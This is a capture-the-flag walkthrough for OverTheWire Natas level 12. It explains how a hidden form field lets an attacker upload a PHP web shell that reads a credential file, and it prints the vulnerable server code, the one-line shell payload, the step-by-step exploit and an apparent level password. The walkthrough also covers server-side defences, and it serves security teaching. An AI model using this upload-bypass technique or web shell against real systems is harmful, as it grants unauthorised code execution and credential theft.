# OverTheWire: Natas — Level 12 → Level 13

> **Vulnerability:** Unrestricted File Upload (Client-Side Extension Bypass)                                
> **Skills:** PHP Web Shell, HTML Form Manipulation, DevTools                                             
> **Difficulty:** Medium                                      
> **Official Page:** [Natas Level 12](https://overthewire.org/wargames/natas/natas12.html)

---

## Access

- **URL:** `http://natas12.natas.labs.overthewire.org`
- **Username:** `natas12`
- **Password:** *obtain from previous level*

---

## Task

Upload a PHP web shell to the server by bypassing the client-side file extension restriction, then execute it to read the password for natas13.

---

## Vulnerability

This level demonstrates **unrestricted file upload with client-side-only extension enforcement**. The server accepts file uploads and assigns a filename based on a value sent in the POST request — specifically the `$_POST["filename"]` parameter. The extension on that filename is extracted client-side (via a hidden HTML form field) and is never validated or sanitised server-side. An attacker who controls that hidden field can rename any uploaded file to `.php`, causing the server to store and subsequently execute it as a PHP script. The developer's mistake is trusting client-supplied metadata to determine what kind of file is being uploaded, rather than inspecting the actual file contents or enforcing the extension server-side.

---

## Theory

### File Upload Vulnerabilities

When a web application accepts file uploads, the server must decide:

1. **What type of file is this?**
2. **Is this type allowed?**
3. **Where should it be stored?**
4. **Under what name?**

Developers often check the file type by looking at the file extension in the submitted filename. This is fundamentally unreliable because the filename is data supplied by the client — it can be anything. A robust server validates file type by reading the actual file contents (magic bytes / MIME sniffing server-side), not by trusting a string in a form field.

### Hidden Form Fields

HTML forms can contain `<input type="hidden">` fields. These are not visible in the rendered page but are submitted as part of the POST body alongside visible fields. They are often used to carry metadata (like a pre-generated filename or an extension). Because they exist in the DOM, they are fully editable using browser DevTools — the server has no way of knowing whether the value was modified before submission.

### PHP Web Shells

If an attacker can upload a file with a `.php` extension to a directory that the web server executes, that file becomes a script the server will run on request. A minimal PHP web shell that reads a file is:

```php
<?php echo exec("cat /etc/natas_webpass/natas13"); ?>
```

When the server receives an HTTP request for that `.php` file, it executes the code and returns the output in the HTTP response body.

### Tools and Concepts Reference

| Tool / Concept | Purpose | Used in Solution |
|---|---|---|
| Browser DevTools (Inspector) | Edit live DOM elements including hidden inputs | Yes |
| `<input type="hidden">` | Carries metadata in a form POST without being visible | Yes (the target to modify) |
| PHP `exec()` | Executes a shell command and returns the last line of output | Yes |
| MIME type validation | Server-side check of actual file contents | No — not present here (good to know) |
| Magic bytes | First bytes of a file that identify its true type, used in server-side MIME checks | No — not used here (good to know) |
| `$_POST` superglobal | PHP array containing all POST body parameters | Yes (source of the vulnerability) |

> **Good to know — not needed here:** MIME type validation and magic byte inspection are the correct server-side defences against this attack. The server in this level performs neither, which is exactly the vulnerability being exploited.

---

## Solution

### Step 1 — Open the challenge page

Navigate to `http://natas12.natas.labs.overthewire.org` and log in with username `natas12` and the password from the previous level. You will see a simple page with a file upload form labelled "Choose a JPEG to upload" and a "Upload File" button.

> **What to notice:** The form explicitly says JPEG. This is the application's stated intent — images only. The question is whether the server actually enforces it.

---

### Step 2 — View the page source

Click "View page source" (right-click on the page and select "View Page Source", or press `Ctrl + U`). Locate the PHP source code rendered in the page. It will look like this:

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
<input type="file" name="uploadedfile" /><br />
<input type="submit" value="Upload File" />
</form>

<?php } ?>
```

> **What to notice:** Two critical things. First, the `makeRandomPathFromFilename` function extracts the extension from `$_POST["filename"]` using `pathinfo()` — the extension comes from the POST body, not from the actual uploaded file. Second, the hidden input `name="filename"` has a pre-generated random string with `.jpg` appended as its value. Whatever extension exists in that hidden field is the extension the uploaded file will be stored with on the server.

---

### Step 3 — Create the PHP web shell

On your local machine, create a file named `shell.php` with the following contents:

```php
<?php echo exec("cat /etc/natas_webpass/natas13"); ?>
```

Save it. This is what you will upload. When the server stores and then serves this file as `.php`, Apache will execute it and return the output of the `cat` command — which is the natas13 password.

> **What to notice:** The payload uses `exec()`, which runs a shell command and returns its output. `echo` then prints that output into the HTTP response. Do not use `require` here — `require` would attempt to include the password file as PHP code, which would fail because the file contains a plain string, not valid PHP syntax.

---

### Step 4 — Edit the hidden form field using DevTools

Before uploading, you need to change the hidden `filename` field from `.jpg` to `.php` so the server stores your file with the correct extension.

1. Open DevTools with `Ctrl + Shift + I` (or right-click the page and choose "Inspect").
2. Switch to the **Inspector** (Elements) tab.
3. Use the element picker (`Ctrl + Shift + C`) and click anywhere on the upload form to locate the form in the DOM.
4. Find the hidden input that carries the filename:

```html
<input type="hidden" name="filename" value="a3f9xk2mbd.jpg">
```

5. Double-click the `value` attribute in the inspector. Change the extension from `.jpg` to `.php`. The result should look like:

```html
<input type="hidden" name="filename" value="a3f9xk2mbd.php">
```

> **What to notice:** You are editing the live DOM in your own browser. The server has no visibility into this change — it will simply receive the POST body that your browser sends after you submit the form, and that POST body will now contain `filename=a3f9xk2mbd.php`.

---

### Step 5 — Upload the shell

With the hidden field now set to `.php`:

1. Click "Choose File" and select your `shell.php` file from disk.
2. Click "Upload File".

The page should respond with a confirmation and a link, for example:

```
The file upload/a3f9xk2mbd.php has been uploaded
```

> **What to notice:** The server accepted the upload without complaint. It did not check the actual contents of the file. It simply used the extension you provided in the hidden field and stored whatever you sent.

---

### Step 6 — Execute the shell

Click the link provided in the upload confirmation, or manually navigate to:

```
http://natas12.natas.labs.overthewire.org/upload/a3f9xk2mbd.php
```

(Replace `a3f9xk2mbd` with whatever random string the server generated for your session.)

The page will render with no HTML — just a single line of output:

```
jmxSiH1YtI1JSqkPFLG2xlBmGpaQ3lEi
```

> **What to notice:** Apache received a request for a `.php` file, handed it to the PHP interpreter, which ran `exec("cat /etc/natas_webpass/natas13")`, and returned the contents of that file in the response. The server executed your code because the file extension told it to. This is the core of an unrestricted file upload vulnerability.

![Upload form with hidden field edited in DevTools](https://i.ibb.co/PKgLbs8/1-d07-B01na-JQ0d-UQWTRHAGcg.webp)

---

## Password for Next Level

```
[omitted — obtain by completing the steps above]
```

---

## Key Takeaways

This level shows that validating a file upload by checking the extension of a client-supplied filename is not validation at all — it is just reading back data the attacker controls. The only reliable way to restrict file types server-side is to inspect the file's actual contents (magic bytes or server-side MIME detection) and to store uploaded files in a location that the web server is configured never to execute. Allowing arbitrary code execution on a server through a file upload is one of the most severe vulnerabilities a web application can have, as it grants the attacker a persistent foothold with the permissions of the web server process.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Using `require` instead of `exec` in the PHP payload | `require` tries to include the password file as PHP code; since it contains a plain string and not valid PHP, it either throws a parse error or outputs nothing useful | Use `echo exec("cat /path/to/file");` to read and print the file contents |
| Editing the `<a>` tag href in the result instead of the hidden input before upload | The link is generated after upload and reflects what was already saved; editing it changes nothing on the server | Edit the hidden `<input name="filename">` field *before* clicking Upload |
| Forgetting to select your `.php` file after editing the hidden field | The form resets or you submit the wrong file | After editing the DOM, select the file and upload in the same browser session without refreshing |
| Navigating to the upload path with the wrong random string | You get a 404 because the path does not exist | Copy the exact link from the upload confirmation response |
| Refreshing the page after editing the DOM | The browser reloads the original HTML, resetting the hidden field back to `.jpg` | Edit the hidden field, then immediately select and upload the file without refreshing |
